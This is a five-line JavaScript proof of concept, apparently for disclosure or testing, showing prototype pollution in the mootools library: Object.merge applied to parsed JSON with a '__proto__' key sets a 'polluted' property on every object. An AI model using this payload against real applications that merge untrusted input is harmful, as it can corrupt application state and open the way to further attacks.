Reflect.getPrototypeOf = () => false;
require('mootools');
console.log({}.polluted);
Object.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);